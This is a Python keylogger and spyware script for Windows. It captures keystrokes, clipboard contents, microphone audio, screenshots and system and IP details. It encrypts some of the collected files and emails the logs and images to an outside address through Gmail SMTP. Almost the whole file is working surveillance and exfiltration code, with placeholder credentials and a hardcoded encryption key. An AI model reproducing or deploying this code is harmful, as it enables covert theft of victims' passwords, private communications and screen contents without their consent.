from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText
from email.mime.base import MIMEBase
from email import encoders
import smtplib
from email.message import EmailMessage

import socket
import platform

import win32clipboard

from pynput.keyboard import Key, Listener

import time
import os

from scipy.io.wavfile import write
import sounddevice as sd

from cryptography.fernet import Fernet

import getpass
from requests import get

from multiprocessing import Process, freeze_support
from PIL import ImageGrab

keys_information = "key_log.txt"
system_information="systeminfo.txt"
clipboard_information="clipboard.txt"
audio_information="audio.vav"
screenshot_information="screenshot.png"

keys_information_e="e_key_log.txt"
system_information_e="e_systeminfo.txt"
clipboard_information_e="e_clipboard.txt"
microphone_time=10
time_iteration=15
number_of_iteration_end=3
email_address="abc@gmail.com"
password="password"
toaddr="xyz@gmail.com"


file_path = "C:\\Users\\seeth\\OneDrive\\Desktop\\keylogger"
extend = "\\"
file_merge=file_path+extend

#Send Email file attachment
# Setup port number and server name
smtp_port = 587  # Standard secure SMTP port
smtp_server = "smtp.gmail.com"  # Google SMTP Server
email_address="abc@gmail.com"
password="password"
toaddr="xyz@gmail.com"

key="EzeAxENSleAqYXrXwHaqqaZf23ZJgqm2gKR_J3IkMGw="

# name the email subject
subject = "Keylogs Information"

# Define the email function
def send_email(filename, attachment, toaddr):
        # make a MIME object to define parts of the email
        fromaddr = email_address
        msg = MIMEMultipart()
        msg['From'] = fromaddr
        msg['To'] = toaddr
        msg['Subject'] = subject

    # Attach the body of the message
        body=f""" Keylog Information """
        msg.attach(MIMEText(body, 'plain'))

    # Define the file to attach
        filename = "filename"

    # Open the file in python as a binary
        attachment = open(attachment, 'rb')  # r for read and b for binary

    # Encode as base 64
        p = MIMEBase('application', 'octet-stream')
        p.set_payload((attachment).read())
        encoders.encode_base64(p)
        p.add_header('Content-Disposition', "attachment; filename=%s " % filename)
        msg.attach(p)

    # Cast as string
        text = msg.as_string()

    # Connect with the server
        print("Connecting to server...")
        s = smtplib.SMTP(smtp_server, smtp_port)
        s.starttls()
        s.login(fromaddr, password)
        print("Succesfully connected to server")
        print()

    # Send emails to "person" as list is iterated
        print(f"Sending email to: {toaddr}...")
        s.sendmail(fromaddr, toaddr, text)
        print(f"Email sent to: {toaddr}")
        print()
        s.quit()
send_email(keys_information, file_merge + keys_information, toaddr)

#To get the information of the computer
def computer_information():
    with open(file_path+extend+system_information,"a") as f:
        hostname=socket.gethostname()
        IPAddr=socket.gethostbyname(hostname)
        try:
            public_ip=get("https://api.ipify.org").text
            f.write("Public IP Address: "+public_ip)
        except Exception:
            f.write("Couldn't get the ip address")
        f.write("Processor: "+(platform.processor())+'\n')
        f.write("System: "+ platform.system()+" "+platform.version()+'\n')
        f.write("Machine: "+platform.machine()+'\n')
        f.write("Hostname: "+hostname+'\n')
        f.write("Private IP Address: "+IPAddr+"\n")
computer_information()

def copy_clipboard():
    with open(file_path+extend+clipboard_information,"a") as f:
        try:
            win32clipboard.OpenClipboard()
            pasted_data=win32clipboard.GetClipboardData()
            win32clipboard.CloseClipboard()
            f.write("Clipboard Data: \n"+pasted_data)
        except:
            f.write("Clipboard could not be copied ;(")
copy_clipboard()


def microphone():
    fs=44100
    seconds=microphone_time
    myrecording = sd.rec(int(seconds * fs), samplerate=fs, channels=2)
    sd.wait()
    write(file_merge+audio_information,fs,myrecording)
microphone()

def screenshot():
    im=ImageGrab.grab()
    im.save(file_merge+screenshot_information)
screenshot()

number_of_iteration=0
currentTime=time.time()
stoppingTime=time.time()+time_iteration
while number_of_iteration<number_of_iteration_end:
    count = 0
    keys = []


    def on_press(key):
        global keys, count,currentTime

        print(key)
        keys.append(key)
        count += 1
        currentTime=time.time()

        if count >= 1:  # to organize the txt file
            count = 0
            write_file(keys)
            keys = []

    def write_file(keys):
        with open(file_path + extend + keys_information, "a") as f:
            for key in keys:
                k = str(key).replace("'", "")
                if k.find("space") > 0:
                    f.write('\n')
                    f.close()
                elif k.find("Key") == -1:
                    f.write(k)
                    f.close()

    def on_release(key):
        if key == Key.esc:
            return False
        if currentTime>stoppingTime:
            return False

    with Listener(on_press=on_press, on_release = on_release) as listener:
        listener.join()

    if currentTime>stoppingTime:
        with open(file_merge+keys_information,"w") as f:
            f.write(" ")

        screenshot()
        send_email(screenshot_information,file_merge+screenshot_information,toaddr)
        copy_clipboard()
        number_of_iteration+=1
        currentTime=time.time()
        stoppingTime=time.time()+time_iteration

#To encrypt the files
files_to_encrypt=[file_merge+system_information,file_merge+clipboard_information,file_merge+keys_information]

encrpted_file_names=[file_merge+system_information_e,file_merge+clipboard_information_e,file_merge+keys_information_e]
c=0
for encrypting_file in files_to_encrypt:
    with open(files_to_encrypt[c],'rb') as f:
        data=f.read()
#To encrypt the keys
    fernet= Fernet(key)
    encrypted=fernet.encrypt(data)

    with open(encrpted_file_names[c],'wb') as f:
        f.write(encrypted)

    send_email(encrpted_file_names[c],encrpted_file_names[c],toaddr)
    c+=1

time.sleep(120)





